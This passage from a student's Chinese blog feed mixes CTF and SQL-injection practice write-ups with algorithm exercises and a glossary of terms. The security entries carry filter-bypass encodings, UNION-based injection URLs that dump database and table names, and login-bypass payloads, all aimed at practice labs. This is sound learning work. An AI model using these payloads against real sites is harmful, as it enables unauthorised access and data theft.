    <id>http://chenxiyuan.vip/2018/12/10/bugku速度要快wp/</id>
    <published>2018-12-10T14:57:01.000Z</published>
    <updated>2018-12-10T15:06:49.866Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://123.206.87.240:8002/web6/" target="_blank" rel="noopener">http://123.206.87.240:8002/web6/</a><br>这道题我首先在headers里发现flag，base64解码然后提交失败，发现是需要post得到的数据，然后试了半天都不对，结果发现需要post的是两次解码后的得到的数字。。。<br>无语，上代码</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://123.206.87.240:8002/web6/'</span></span><br><span class="line">s = requests.Session()<span class="comment">#创建session对象，保存Cookie值</span></span><br><span class="line">r = s.get(url)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">txt1 = re.search("flag': '(.*?)',",str(r.headers),re.S)</span></span><br><span class="line"><span class="string">txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1.group(1))),re.S)</span></span><br><span class="line"><span class="string">这个是我刚开始绕的弯路,基础功不扎实</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">txt1=r.headers[<span class="string">'flag'</span>]</span><br><span class="line">txt2=re.search(<span class="string">".*?: (.*?)'"</span>,str(base64.b64decode(txt1)),re.S)</span><br><span class="line">flag=base64.b64decode(txt2.group(<span class="number">1</span>))</span><br><span class="line">d=&#123;<span class="string">"margin"</span>:flag&#125;</span><br><span class="line">print(s.post(url,data=d).text)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://123.206.87.240:8002/web6/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://123.206.87.240:8002/web6/&lt;/a&gt;&lt;br&gt;这道题我首先在headers里发现flag，base64解码然后提交失败，发现是需要post得到的数据，然后试了半天都不对，结果发现需要post的是两次解码后的得到的数字。。。&lt;br&gt;无语，上代码&lt;/p&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>nctf打卡题</title>
    <link href="http://chenxiyuan.vip/2018/11/27/nctf%E6%89%93%E5%8D%A1%E9%A2%98/"/>
    <id>http://chenxiyuan.vip/2018/11/27/nctf打卡题/</id>
    <published>2018-11-27T11:47:09.000Z</published>
    <updated>2018-11-27T12:13:16.329Z</updated>
    
    <content type="html"><![CDATA[<p>我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。<br><a href="http://ctfgame.acdxvfsvd.net:20001/" target="_blank" rel="noopener">http://ctfgame.acdxvfsvd.net:20001/</a><br>首先学到了空格的过滤绕过：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="number">20</span> <span class="meta">%</span><span class="number">09</span> <span class="meta">%</span><span class="number">0</span>a <span class="meta">%</span><span class="number">0</span>b <span class="meta">%</span><span class="number">0</span>c <span class="meta">%</span><span class="number">0</span>d <span class="meta">%</span>a<span class="number">0</span> <span class="meta">%</span><span class="number">00</span> <span class="comment">/**/</span>    <span class="comment">()</span></span><br></pre></td></tr></table></figure></p><p>发现过滤了截断符号%23,#,–+，只要在语句最后在加个单引号使其闭合就可以了，’’空的也可以执行，就不用用注释了。<br>然后大佬提到’必须直接跟在select后。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1''    查询:<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'''</span> LIMIT0,<span class="number">1</span>     可以</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and 1=1'</span> 查询:<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>   不可以</span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">'  union select 1,2,3'</span>   可以</span><br></pre></td></tr></table></figure></p><p>然后用子查询进行操作,select * from user where id=’-1’ union select (select group_concat(schema_name) from information_schema.schemata),2,3’，这样就行了。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(<span class="keyword">select</span>%a0group_concat(schema_name)%a0from%a0information_schema.schemata),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>爆数据库名，应该是这个flaaaaaaag数据库。</span><br><span class="line"><span class="keyword">http</span>://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?<span class="keyword">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0union%a0select%a0(<span class="keyword">select</span>%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%<span class="number">27</span>flaaaaaaag%<span class="number">27</span>),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>爆表名，f144444444g</span><br><span class="line"><span class="keyword">http</span>://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?<span class="keyword">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0union%a0select%a0(<span class="keyword">select</span>%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=%<span class="number">27</span>f144444444g%<span class="number">27</span>),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>爆列名，th1s_1s_flag</span><br><span class="line"><span class="keyword">http</span>://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?<span class="keyword">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0union%a0select%a0(<span class="keyword">select</span>%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>查询到flag</span><br></pre></td></tr></table></figure></p><p>收获很多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。&lt;br&gt;&lt;a href=&quot;http://ctfgame.acdxvfsvd.net:20001/&quot; t
      
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="sql注入" scheme="http://chenxiyuan.vip/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>11.15</title>
    <link href="http://chenxiyuan.vip/2018/11/15/11-15/"/>
    <id>http://chenxiyuan.vip/2018/11/15/11-15/</id>
    <published>2018-11-15T09:33:15.000Z</published>
    <updated>2019-05-07T12:47:52.151Z</updated>
    
    <content type="html"><![CDATA[<p>这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！<br>然后昨天郁师傅推荐了一个上传漏洞的靶场<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a>，于是我又要学php了，得学会php的代码审计吧！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！&lt;br&gt;然后昨天郁师傅推荐了一个上传漏洞的靶场&lt;a href=&quot;https://github.com/c0ny1/upload-labs&quot; target=&quot;_blank&quot; rel=&quot;no
      
    
    </summary>
    
      <category term="随笔" scheme="http://chenxiyuan.vip/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>铺地毯问题</title>
    <link href="http://chenxiyuan.vip/2018/11/04/%E9%93%BA%E5%9C%B0%E6%AF%AF%E9%97%AE%E9%A2%98/"/>
    <id>http://chenxiyuan.vip/2018/11/04/铺地毯问题/</id>
    <published>2018-11-04T02:43:19.000Z</published>
    <updated>2018-11-04T03:12:59.966Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://i1.fuimg.com/665720/1c38c0a3231c128a.png" alt="Markdown"><br><img src="http://i1.fuimg.com/665720/9dce7adb8d106511.png" alt="Markdown"><br>这道题我进坑了，我看到这个题的第一反应就是定义一个二维数组模拟坐标系，按顺序把地毯数存进覆盖的坐标中。然后我就看到内存达到128000KB，下载输入测试文件，发现了10000个地毯数据QAQ~!!<br><img src="http://i2.tiimg.com/665720/d23265a1ec0769f7.png" alt="Markdown"><br><a id="more"></a><br>刚开始的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10001</span>][<span class="number">10001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x,y,a,b,g,h;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d %d"</span>,&amp;a,&amp;b,&amp;g,&amp;h);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=a;j&lt;=a+g;j++)<span class="comment">//把地毯覆盖的点赋值 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=b;k&lt;=b+h;k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">array</span>[j][k]=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;x,&amp;y);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">array</span>[x][y]==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-1"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="built_in">array</span>[x][y]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><p>然后我就去看下大佬是怎么解决的，瞬间就明白了，微笑，默叹，以为妙绝。<br>正确思路应该是这样的，定义一个数组，按顺序保存地毯四个角的坐标，再逆序判断给定点是否在地毯内就行了。<br>改写代码如下，顺利AC，收获挺大的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10001</span>][<span class="number">5</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y,n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d %d %d"</span>,&amp;a[i][<span class="number">1</span>],&amp;a[i][<span class="number">2</span>],&amp;a[i][<span class="number">3</span>],&amp;a[i][<span class="number">4</span>]);</span><br><span class="line">        a[i][<span class="number">3</span>]+=a[i][<span class="number">1</span>];</span><br><span class="line">        a[i][<span class="number">4</span>]+=a[i][<span class="number">2</span>];</span><br><span class="line">    &#125;<span class="comment">//数组只是用来记录第i个地毯的四个点的坐标 </span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;x,&amp;y);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;i--)<span class="comment">//逆序判断地毯是否覆盖（x，y）</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">1</span>]&lt;=x&amp;&amp;a[i][<span class="number">2</span>]&lt;=y&amp;&amp;a[i][<span class="number">3</span>]&gt;=x&amp;&amp;a[i][<span class="number">4</span>]&gt;=y) </span><br><span class="line">&#123;<span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-1"</span>);<span class="comment">//没有则输出-1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://i1.fuimg.com/665720/1c38c0a3231c128a.png&quot; alt=&quot;Markdown&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://i1.fuimg.com/665720/9dce7adb8d106511.png&quot; alt=&quot;Markdown&quot;&gt;&lt;br&gt;这道题我进坑了，我看到这个题的第一反应就是定义一个二维数组模拟坐标系，按顺序把地毯数存进覆盖的坐标中。然后我就看到内存达到128000KB，下载输入测试文件，发现了10000个地毯数据QAQ~!!&lt;br&gt;&lt;img src=&quot;http://i2.tiimg.com/665720/d23265a1ec0769f7.png&quot; alt=&quot;Markdown&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="c" scheme="http://chenxiyuan.vip/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>尝试简单的sql注入</title>
    <link href="http://chenxiyuan.vip/2018/11/02/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://chenxiyuan.vip/2018/11/02/简单的sql注入/</id>
    <published>2018-11-02T15:07:56.000Z</published>
    <updated>2018-11-02T16:17:29.519Z</updated>
    
    <content type="html"><![CDATA[<p>感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。<br>说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。<a href="https://bbs.pediy.com/thread-218653.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218653.htm</a><br>这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址<a href="http://43.247.91.228:83/login-pages.html" target="_blank" rel="noopener">http://43.247.91.228:83/login-pages.html</a><br><a id="more"></a><br>第一题在username输入以下语句都可以，只要让引号闭合并使语句成立就行，比如可以在后面加#，注释掉后面的语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1' or 1 <span class="comment">#</span></span><br><span class="line">1' or 1 or '</span><br><span class="line">' or 1 <span class="comment">#</span></span><br><span class="line">' or 1 or '</span><br><span class="line">1' or 1=1 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><hr><p>第二题发现使用了js验证，加了黑名单禁止输入特殊字符。可以右键查看源代码看看js代码，然后打开开发者工具在console里修改该js函数，再使用注入语句就行了。<br><img src="http://i1.fuimg.com/665720/d3c609b2d711cc88.png" alt="第2题"><br><img src="http://i1.fuimg.com/665720/e71b70b1dcc2c017.png" alt="第2题"></p><hr><p>第三题发现它在两边加入了括号()，所以只要构造语句使括号闭合就行。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1') or 1 <span class="comment">#</span></span><br><span class="line">1') or 1 or('</span><br></pre></td></tr></table></figure></p><hr><p>第四题和第三题差不多，只不过使用双引号””包裹字符串。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1") or 1 <span class="comment">#</span></span><br><span class="line">1") or 1 or ("</span><br></pre></td></tr></table></figure></p><hr><p>第五题直接用第一题的语句注入，发现返回了输入密码的MD5值，虽然我不知道这是干什么的。</p><hr><p>第六题我也不知道是干啥的，可以直接注入，我搜了下题目名automatic redirect 叫自动重定向。我再问问大佬这是啥。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。&lt;br&gt;说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。&lt;a href=&quot;https://bbs.pediy.com/thread-218653.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bbs.pediy.com/thread-218653.htm&lt;/a&gt;&lt;br&gt;这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址&lt;a href=&quot;http://43.247.91.228:83/login-pages.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://43.247.91.228:83/login-pages.html&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="sql注入" scheme="http://chenxiyuan.vip/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>算法上的一些术语</title>
    <link href="http://chenxiyuan.vip/2018/11/02/%E7%AE%97%E6%B3%95%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%AF%E8%AF%AD/"/>
    <id>http://chenxiyuan.vip/2018/11/02/算法上的一些术语/</id>
    <published>2018-11-02T03:00:30.000Z</published>
    <updated>2018-11-02T07:23:23.027Z</updated>
    
    <content type="html"><![CDATA[<p>我发现了一个较严重问题，就是听不懂大佬说的一些名词，感受到了莫名的恐惧？？？于是我从网上找了一些术语，写在这里。<br><a id="more"></a></p><h2 id="OJ平台"><a href="#OJ平台" class="headerlink" title="OJ平台"></a>OJ平台</h2><table><thead><tr><th>简写</th><th>全称</th><th>中文称谓</th></tr></thead><tbody><tr><td>OJ</td><td>Online Judge</td><td>在线判题系统</td></tr><tr><td>AC</td><td>Accepted</td><td>通过</td></tr><tr><td>WA</td><td>Wrong Answer</td><td>答案错误</td></tr><tr><td>TLE</td><td>Time Limit Exceed</td><td>超时</td></tr><tr><td>OLE</td><td>Output Limit Exceed</td><td>超过输出限制</td></tr><tr><td>MLE</td><td>Memory Limit Exceed</td><td>超内存</td></tr><tr><td>RE</td><td>Runtime Error</td><td>运行时错误</td></tr><tr><td>PE</td><td>Presentation Error</td><td>格式错误</td></tr><tr><td>CE</td><td>Compile Error</td><td>无法编译</td></tr></tbody></table><hr><h2 id="算法常用术语英中对照"><a href="#算法常用术语英中对照" class="headerlink" title="算法常用术语英中对照"></a>算法常用术语英中对照</h2><table><thead><tr><th>英语</th><th>中文</th></tr></thead><tbody><tr><td>Approximate String Matching</td><td>模糊匹配</td></tr><tr><td>Arbitrary Precision Arithmetic</td><td>高精度计算</td></tr><tr><td>Bandwidth Reduction</td><td>带宽压缩</td></tr><tr><td>Bin Packing</td><td>装箱问题</td></tr><tr><td>Calendrical Calculations</td><td>日期</td></tr><tr><td>Clique</td><td>最大团</td></tr><tr><td>Combinatorial Problems</td><td>组合问题</td></tr><tr><td>Computational Geometry</td><td>计算几何</td></tr><tr><td>Connected Components</td><td>连通分支</td></tr><tr><td>Constrained and Unconstrained Optimization</td><td>最值问题</td></tr><tr><td>Convex Hull</td><td>凸包</td></tr><tr><td>Cryptography</td><td>密码</td></tr><tr><td>Data Structures</td><td>基本数据结构</td></tr><tr><td>Determinants and Permanents</td><td>行列式</td></tr><tr><td>Dictionaries</td><td>字典</td></tr><tr><td>Discrete Fourier Transform</td><td>离散Fourier变换</td></tr><tr><td>Drawing Graphs Nicely</td><td>图的描绘</td></tr><tr><td>Drawing Trees</td><td>树的描绘</td></tr><tr><td>Edge and Vertex Connectivity</td><td>割边/割点</td></tr><tr><td>Edge Coloring</td><td>边染色</td></tr><tr><td>Eulerian Cycle / Chinese Postman Euler</td><td>回路/中国邮路</td></tr><tr><td>Factoring and Primality Testing</td><td>因子分解/质数判定</td></tr><tr><td>Feedback Edge/Vertex Set</td><td>最大无环子图</td></tr><tr><td>Finite State Machine Minimization</td><td>有穷自动机简化</td></tr><tr><td>Generating Graphs</td><td>图的生成</td></tr><tr><td>Generating Partitions</td><td>划分生成</td></tr><tr><td>GeneratingPermutations</td><td>排列生成</td></tr><tr><td>GeneratingSubsets</td><td>子集生成</td></tr><tr><td>Graph Data Structures</td><td>图形数据结构</td></tr><tr><td>Graph Isomorphism</td><td>图同构</td></tr><tr><td>Graph Partition</td><td>图的划分</td></tr><tr><td>Graph Problems — hard</td><td>图论-NP问题</td></tr><tr><td>Graph Problems — polynomial</td><td>图论-多项式算法</td></tr><tr><td>Hamiltonian Cycle Hamilton</td><td>回路</td></tr><tr><td>Independent Set</td><td>独立集</td></tr><tr><td>Intersection Detection</td><td>碰撞测试</td></tr><tr><td>Job Scheduling</td><td>工程安排</td></tr><tr><td>Kd-Trees</td><td>线段树</td></tr><tr><td>Knapsack Problem</td><td>背包问题</td></tr><tr><td>Linear Programming</td><td>线性规划</td></tr><tr><td>Longest Common Substring</td><td>最长公共子串</td></tr><tr><td>Maintaining Line Arrangements</td><td>平面分割</td></tr><tr><td>Matching</td><td>匹配</td></tr><tr><td>Matrix Multiplication</td><td>矩阵乘法</td></tr><tr><td>Medial-Axis Transformation</td><td>中轴变换</td></tr><tr><td>Median and Selection</td><td>中位数</td></tr><tr><td>Minimum Spanning Tree</td><td>最小生成树</td></tr><tr><td>Minkowski Sum</td><td>Minkowski和</td></tr><tr><td>Motion Planning</td><td>运动规划</td></tr><tr><td>Nearest Neighbor Search</td><td>最近点对查询</td></tr><tr><td>Network Flow</td><td>网络流</td></tr><tr><td>Numerical Problems</td><td>数值问题</td></tr><tr><td>Planarity Detection and Embedding</td><td>平面性检测和嵌入</td></tr><tr><td>Point Location</td><td>位置查询</td></tr><tr><td>Polygon Partitioning</td><td>多边形分割</td></tr><tr><td>Priority Queues</td><td>优先队列</td></tr><tr><td>Random Number Generation</td><td>随机数生成</td></tr><tr><td>Range Search</td><td>范围查询</td></tr><tr><td>rate of convergence</td><td>收敛速度</td></tr><tr><td>robustness</td><td>鲁棒性</td></tr><tr><td>Satisfiability</td><td>可满足性</td></tr><tr><td>Searching</td><td>查找</td></tr><tr><td>Set and String Problems</td><td>集合与串的问题</td></tr><tr><td>Set Cover</td><td>集合覆盖</td></tr><tr><td>Set Data Structures</td><td>集合</td></tr><tr><td>Shape Similarity</td><td>相似多边形</td></tr><tr><td>Shortest Common Superstring</td><td>最短公共父串</td></tr><tr><td>Shortest Path</td><td>最短路径</td></tr><tr><td>Simplifying Polygons</td><td>多边形化简</td></tr><tr><td>Solving Linear Equations</td><td>线性方程组</td></tr><tr><td>Sorting</td><td>排序</td></tr><tr><td>Steiner Tree</td><td>Steiner树</td></tr><tr><td>String Matching</td><td>模式匹配</td></tr><tr><td>Text Compression</td><td>压缩</td></tr><tr><td>Topological Sorting</td><td>拓扑排序</td></tr><tr><td>Transitive Closure and Reduction</td><td>传递闭包</td></tr><tr><td>Traveling Salesman Problem</td><td>旅行商问题</td></tr><tr><td>Triangulation</td><td>三角剖分</td></tr><tr><td>Vertex Coloring</td><td>点染色</td></tr><tr><td>Vertex Cover</td><td>点覆盖</td></tr><tr><td>Voronoi Diagrams</td><td>Voronoi图</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我发现了一个较严重问题，就是听不懂大佬说的一些名词，感受到了莫名的恐惧？？？于是我从网上找了一些术语，写在这里。&lt;br&gt;
    
    </summary>
    
      <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="术语" scheme="http://chenxiyuan.vip/tags/%E6%9C%AF%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>过河卒问题</title>
    <link href="http://chenxiyuan.vip/2018/11/01/%E8%BF%87%E6%B2%B3%E5%8D%92%E9%97%AE%E9%A2%98/"/>
    <id>http://chenxiyuan.vip/2018/11/01/过河卒问题/</id>
    <published>2018-11-01T12:21:16.000Z</published>
    <updated>2018-11-02T07:26:34.557Z</updated>
    
    <content type="html"><![CDATA[<p>学长给我安利洛谷平台，我打算开始做题然后提升，结果我做过河卒这个题就做了一天。刚开始写的程序有一些逻辑上的漏洞，测试时不能全部通过，曹老板告诉我可以下载测试数据来看，然后就找到漏洞所在，再一个一个的完善，做出来后还是很开心的。<br><img src="http://i2.tiimg.com/665720/d0a9f9971eb168e0.png" alt="过河卒问题"><br><img src="http://i2.tiimg.com/665720/926f53a9ceaee312.png" alt="过河卒问题"><br><a id="more"></a></p><h2 id="我的心路历程"><a href="#我的心路历程" class="headerlink" title="我的心路历程"></a>我的心路历程</h2><p>首先可以发现到达当前坐标的路径数等于左边和上边路径数之和，然后我就想构造二维数组，用遍历的方法，把每一个坐标都算出来。在此之前，我需要把第0行第0列赋值为1，也需要判断马控制的坐标(马走日)在不在数组内，并赋值为0，在循环的时候写判断跳过控制点即可。<br>我的方法就是这么复杂，以至于我刚开始漏掉好多判断条件，比如说当马控制点落在第0行或第0列时，控制点之后都将为0。<br>当我看题解的时候，发现一堆我看不懂的名词，什么动态规划dp，什么滚动数组，还有用递归的方法做。我这个渣渣还是遍历就好了，等我再学一段时间，再来看会不会这些方法，并写进来。</p><h2 id="我的代码"><a href="#我的代码" class="headerlink" title="我的代码"></a>我的代码</h2><p>先附上我的遍历方法，学会更好的方法再补充。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 